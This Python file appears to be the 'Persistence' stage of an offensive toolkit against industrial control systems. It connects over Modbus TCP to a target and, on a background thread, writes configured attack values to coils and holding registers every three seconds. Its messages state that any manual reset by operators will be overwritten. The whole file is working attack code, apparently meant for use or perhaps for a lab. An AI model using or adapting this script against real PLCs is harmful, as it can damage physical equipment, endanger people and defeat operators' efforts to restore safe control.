import time
import threading
from pymodbus.client import ModbusTcpClient
from scripts.config import get, REGISTERS
from utils.colors import ok, err, info, warn, red, yellow, cyan, white
from utils import logger

STAGE = {
    'name': 'Persistence',
    'key':  '4',
    'desc': 're-applies attack values every 3s',
}

BANNER = f"""
{red("  ╔══════════════════════════════════════╗")}
{red("  ║")} {white("STAGE 4 -- PERSISTENCE                 ")}{red("║")}
{red("  ╚══════════════════════════════════════╝")}
"""

ATTACK   = REGISTERS['attack']
INTERVAL = 3
_stop    = threading.Event()


def _apply(client):
    for addr, val in ATTACK['coils'].items():
        client.write_coil(address=addr, value=val)
    for addr, val in ATTACK['holding'].items():
        client.write_register(address=addr, value=val)


def _bar(tick, interval=INTERVAL, width=30):
    filled = int((tick % interval) / interval * width)
    bar    = red('█' * filled) + '░' * (width - filled)
    return f"[{bar}]"


def _loop(ip, port):
    client = ModbusTcpClient(ip, port=port)
    client.connect()
    tick = 0

    while not _stop.is_set():
        try:
            _apply(client)
            tick += 1
            bar = _bar(tick % INTERVAL)
            print(
                f"\r  {red('[PERSIST]')} tick {yellow(str(tick)):>4}  "
                f"next write in {INTERVAL}s  {bar}  ",
                end='', flush=True
            )
            logger.attack(f"Persistence tick {tick} -- attack values re-applied")
        except Exception as e:
            print()
            print(warn(f"Reconnecting... ({e})"))
            client.close()
            client = ModbusTcpClient(ip, port=port)
            client.connect()
        time.sleep(INTERVAL)

    client.close()
    print()
    print(ok("Persistence loop stopped."))
    logger.info("Persistence loop stopped.")


def run(cfg=None):
    if cfg is None:
        cfg = get()
    ip   = cfg['target_ip']
    port = cfg['target_port']

    print(BANNER)
    print(info("Persistence mode re-applies attack values every 3 seconds."))
    print(info("Any manual reset will be overwritten within the interval."))
    print()
    print(warn("Press Ctrl+C to stop."))
    print()

    _stop.clear()
    t = threading.Thread(target=_loop, args=(ip, port), daemon=True)
    t.start()
    logger.attack(f"Persistence loop started against {ip}:{port}")

    try:
        while t.is_alive():
            time.sleep(0.3)
    except KeyboardInterrupt:
        print()
        print(info("Stopping persistence..."))
        _stop.set()
        t.join()
